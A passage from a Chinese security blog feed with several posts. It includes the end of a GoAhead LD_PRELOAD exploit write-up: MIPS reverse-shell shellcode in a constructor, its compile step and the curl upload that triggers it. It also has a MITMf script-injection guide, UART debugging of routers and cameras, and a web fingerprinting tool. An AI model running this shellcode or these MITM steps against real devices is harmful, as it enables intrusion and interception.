&quot;\x20\x80\x01\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24&quot;</span><br><span class="line">    &quot;\x0c\x09\x09\x01\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09&quot;</span><br><span class="line">    &quot;\x01\xc9\x0f\x02\x24\x0c\x09\x09\x01\x15\xb3\x05\x3c\x02\x00&quot;</span><br><span class="line">    &quot;\xa5\x34\xf8\xff\xa5\xaf\x10\x67\x05\x3c\xc0\xa8\xa5\x34\xfc&quot;</span><br><span class="line">    &quot;\xff\xa5\xaf\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01&quot;</span><br><span class="line">    &quot;\x4a\x10\x02\x24\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08&quot;</span><br><span class="line">    &quot;\x35\xec\xff\xa8\xaf\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff&quot;</span><br><span class="line">    &quot;\xa8\xaf\xff\xff\x07\x28\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec&quot;</span><br><span class="line">    &quot;\xff\xa4\x23\xec\xff\xa8\x23\xf8\xff\xa8\xaf\xf8\xff\xa5\x23&quot;</span><br><span class="line">    &quot;\xec\xff\xbd\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x09\x09&quot;</span><br><span class="line">    &quot;\x01&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void(*s)(void);</span><br><span class="line">    s = sc;</span><br><span class="line">    s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Buildroot编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mipsel-linux-gcc -shared -fPIC mipsel-reverse-tcp.c -o mipsel-reverse-tcp.so</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地 nc 监听 5555 端口，把生成的so文件post到目标</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST   -b  &quot;user=admin;platform=0&quot;  --data-binary @payloads/mipsel-reverse-tcp.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0</span><br></pre></td></tr></table></figure><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137897078140.jpg" alt=""></p><p>成功反弹shell<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137898902411.jpg" alt=""></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。</li><li>如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>Remote LD_PRELOAD Exploitation   <a href="https://www.elttam.com.au/blog/goahead" target="_blank" rel="noopener">https://www.elttam.com.au/blog/goahead</a></li><li>routesplite  <a href="https://github.com/reverse-shell/routersploit" target="_blank" rel="noopener">https://github.com/reverse-shell/routersploit</a></li><li>硬件调试  <a href="http://future-sec.com/iot-security-hardware-debuging.html" target="_blank" rel="noopener">http://future-sec.com/iot-security-hardware-debuging.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="goahead" scheme="http://yaseng.org/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>使用MITMF中间人攻击非80端口的HTTP</title>
    <link href="http://yaseng.org/using-MITMF-attack-not-80-port-http.html"/>
    <id>http://yaseng.org/using-MITMF-attack-not-80-port-http.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2018-06-29T10:33:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。<br>例如注入一段js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  python mitmf.py  -i wlan0 --spoof --arp --target  172.18.219.3 --gateway  172.18.219.1  --inject --html-payload &apos;&lt;script&gt;alert(0)&lt;/script&gt;&apos;</span><br></pre></td></tr></table></figure><p>victim 访问<br><a href="http://yaseng.org/project">http://yaseng.org/project</a></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129397954576.jpg" alt=""></p><p>访问非80端口的http web<br><a href="http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml" target="_blank" rel="noopener">http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml</a><br>无任何提示  </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129398489571.jpg" alt=""></p><p>attack 端</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot35.jpg" alt="img"></p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>简单看了一下代码<br>MITMf/core/utils.py   line:84</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def HTTP(self, http_redir_port):</span><br><span class="line">    log.debug(&quot;Setting iptables HTTP redirection rule from port 80 to &#123;&#125;&quot;.format(http_redir_port))</span><br><span class="line">    os.system(&apos;iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;&apos;.format(http_redir_port))</span><br></pre></td></tr></table></figure><p>iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。<br>例如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port  10000</span><br></pre></td></tr></table></figure><p>attack</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot36.jpg" alt="mg"><br>victim<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129405294732.jpg" alt=""></p><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>使用mitmf 来绕过HSTS站点抓取登陆明文  <a href="http://yaseng.org/hsts-bypass-with-mitmf.html">http://yaseng.org/hsts-bypass-with-mitmf.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;p&gt;MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yaseng.org/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="中间人攻击" scheme="http://yaseng.org/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
      <category term="渗透测试" scheme="http://yaseng.org/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="MITMf" scheme="http://yaseng.org/tags/MITMf/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-串口调试</title>
    <link href="http://yaseng.org/iot-security-hardware-debuging.html"/>
    <id>http://yaseng.org/iot-security-hardware-debuging.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2018-06-29T10:55:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。<br>通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。<br>对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别,  以及RS232, TTL等关系,             实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).<br>UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。<br> 在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image32.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image33.jpg" alt=""></p><h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image65.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image66.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image67.jpg" alt=""></p><p>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image68.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image69.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image70.jpg" alt=""></p><p>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image101.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image102.jpg" alt=""></p><p>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image71.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image72.jpg" alt=""></p><h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image73.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image35.jpg" alt=""></p><p>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image74.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image75.jpg" alt=""></p><h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image76.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image77.jpg" alt=""></p><p>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image78.jpg" alt=""></p><h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image79.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image80.jpg" alt=""></p><p>设置波特率为57600，串口输出正确，并可执行命令。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image81.jpg" alt=""></p><h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image82.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image83.jpg" alt=""></p><p>设置波特率为57600，串口输出正确，并可执行命令。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image84.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image85.jpg" alt=""></p><p>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image86.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image87.jpg" alt=""></p><h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image88.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image89.jpg" alt=""><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image90.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image91.jpg" alt=""></p><h3 id="案例六：调试某无线数据终端"><a href="#案例六：调试某无线数据终端" class="headerlink" title="案例六：调试某无线数据终端"></a>案例六：调试某无线数据终端</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image122.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image123.jpg" alt=""></p><p>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image124.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image125.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="UART串口调试" scheme="http://yaseng.org/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>浅谈现代化指纹识别及工具编写</title>
    <link href="http://yaseng.org/yet-another-web-fingerprinter.html"/>
    <id>http://yaseng.org/yet-another-web-fingerprinter.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:34:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。</p><h2 id="传统的指纹识别"><a href="#传统的指纹识别" class="headerlink" title="传统的指纹识别"></a>传统的指纹识别</h2><p>一些扫描器里面使用的比较多的都是通过特殊路径  静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15047737007020.jpg" alt="img"><br>存在几个问题</p><ol><li>效率太低，每一个路径都需要访问一次。容易被waf拦截</li><li>目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 </li></ol><h2 id="现代化指纹识别"><a href="#现代化指纹识别" class="headerlink" title="现代化指纹识别"></a>现代化指纹识别</h2><p>怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header  能识别出80% 的app<br>例如WordPress，discuz  会把独特的cookie放到header 里面。<br>discuz  的关键词  _saltkey=<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109122240334.jpg" alt="img"></p><p>默认首页也会有很多固定的关键词，  WordPress   wp-conetnt<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109123220322.jpg" alt="img"></p><p>剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。</p><h2 id="现代化指纹识别方案"><a href="#现代化指纹识别方案" class="headerlink" title="现代化指纹识别方案"></a>现代化指纹识别方案</h2><h3 id="指纹库设计"><a href="#指纹库设计" class="headerlink" title="指纹库设计"></a>指纹库设计</h3><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191426.jpg" alt="img"><br>指纹库类型目前有3种 ，当然后续还需要加上正则。<br>finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如  weblogic 的指纹规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;port&apos;:7001,&apos;url&apos;: &apos;/console/login/LoginForm.jsp&apos;, &apos;code&apos;: 200, &apos;grep&apos;: &apos;WebLogic Server&apos;&#125;</span><br></pre></td></tr></table></figure><p>下面介绍每一种指纹库实例</p><h4 id="指纹规则"><a href="#指纹规则" class="headerlink" title="指纹规则"></a>指纹规则</h4><h5 id="web-header-contain"><a href="#web-header-contain" class="headerlink" title="web_header_contain"></a>web_header_contain</h5><p>首页 response 里面的 header 查找特征符<br>速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。<br>例如 discuz,jboss,wordpress 等。<br>规则编写,以discuz 为例 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  -I    www.cctry.com</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Microsoft-IIS/6.0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Date: Thu, 07 Jan 2016 18:22:34 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Powered-By: PHP/5.2.17</span><br><span class="line">Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponly</span><br><span class="line">Set-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/</span><br><span class="line">Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</span><br><span class="line">Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</span><br><span class="line">X-Daa-Tunnel: hop_count=1</span><br></pre></td></tr></table></figure><p>经过分析,字符串 _saltkey=  为discuz  header 中的规则<br>具体规则如下<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191240.jpg" alt="img"></p><h5 id="web-index-contain"><a href="#web-index-contain" class="headerlink" title="web_index_contain"></a>web_index_contain</h5><p>在缓存的首页里面查找关键词或者正则匹配<br>优先级次之,只需要 get请求一次即可。<br>例如Office Anywhere   指纹 编写流程<br>数据包分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  http://125.91.218.186:8000/   |  grep   <span class="string">'/images/tongda.ico'</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  2001  100  2001    0     0  11795      0 --:--:-- --:--:-- --:--:-- 11840</span><br><span class="line">&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/images/tongda.ico"</span>&gt;</span><br></pre></td></tr></table></figure><p>规则编写<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191233.jpg" alt="img"></p><h5 id="web-url-contain"><a href="#web-url-contain" class="headerlink" title="web_url_contain"></a>web_url_contain</h5><p>特殊url 查找指定的关键词(返回状态码也指定)。<br>优先级最低。<br>例如  weblogic 的指纹 finger 过程<br>数据包分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  -I     http://202.97.194.9:7001/console/login/LoginForm.jsp</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Date: Thu, 07 Jan 2016 18:53:28 GMT</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line">Set-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/</span><br><span class="line">Content-Language: zh-CN</span><br><span class="line">X-Powered-By: Servlet/2.5 JSP/2.1</span><br></pre></td></tr></table></figure><p>规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;url&apos;: &apos;/console/login/LoginForm.jsp&apos;, &apos;code&apos;: 200, &apos;grep&apos;: &apos;WebLogic Server&apos;&#125;</span><br></pre></td></tr></table></figure><p>表<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191224.jpg" alt="img"></p><h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>指纹识别模块代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> *@Projet  Yafinger</span><br><span class="line"> *@Author  yaseng@uauc.net</span><br><span class="line"> *@Desc    playweb finger modules</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import ast,time</span><br><span class="line">import config</span><br><span class="line">from   lib                import util</span><br><span class="line"></span><br><span class="line">def get_web_app(url):</span><br><span class="line">    rsp_index = util.http_get(url)</span><br><span class="line">    str_index = &quot;&quot;</span><br><span class="line">    if rsp_index == None :</span><br><span class="line">        return None</span><br><span class="line">    list_app=[]</span><br><span class="line">    fingers=config.get(&apos;fingers&apos;);</span><br><span class="line">    for  finger  in   fingers :</span><br><span class="line">        rule = ast.literal_eval(finger[&apos;finger&apos;])</span><br><span class="line">        if finger[&apos;type&apos;] == &apos;web_index_contain&apos;: </span><br><span class="line">            # limit header and  body and code  exp : &#123;&apos;header&apos;:&apos;jsessionid=&apos;,&apos;code&apos;: 200, &apos;grep&apos;: &apos;.action&apos;&#125;</span><br><span class="line">            if rule.has_key(&apos;header&apos;) and  rule[&apos;header&apos;] not in   str(rsp_index[&apos;headers&apos;]).lower()  : </span><br><span class="line">                continue</span><br><span class="line">            if rsp_index[&apos;code&apos;] == rule[&apos;code&apos;] and  rule[&apos;grep&apos;]  in rsp_index[&apos;data&apos;] :</span><br><span class="line">                list_app.append(&#123;&apos;app_id&apos;:finger[&apos;id&apos;], &apos;url&apos;:url&#125;)</span><br><span class="line">                util.log(&quot;url:%s app:%s&quot; % (url, finger[&apos;app_name&apos;]))</span><br><span class="line">    </span><br><span class="line">        elif finger[&apos;type&apos;] == &apos;web_url_contain&apos; :</span><br><span class="line">             rsp_tmp = util.http_get(url + rule[&apos;url&apos;])</span><br><span class="line">             if rsp_tmp == None :</span><br><span class="line">                 continue</span><br><span class="line">             if rsp_tmp[&apos;code&apos;] == rule[&apos;code&apos;] and  rule[&apos;grep&apos;]  in rsp_tmp[&apos;data&apos;] :</span><br><span class="line">                 list_app.append(&#123;&apos;app_id&apos;:finger[&apos;id&apos;], &apos;url&apos;:url&#125;)</span><br><span class="line">                 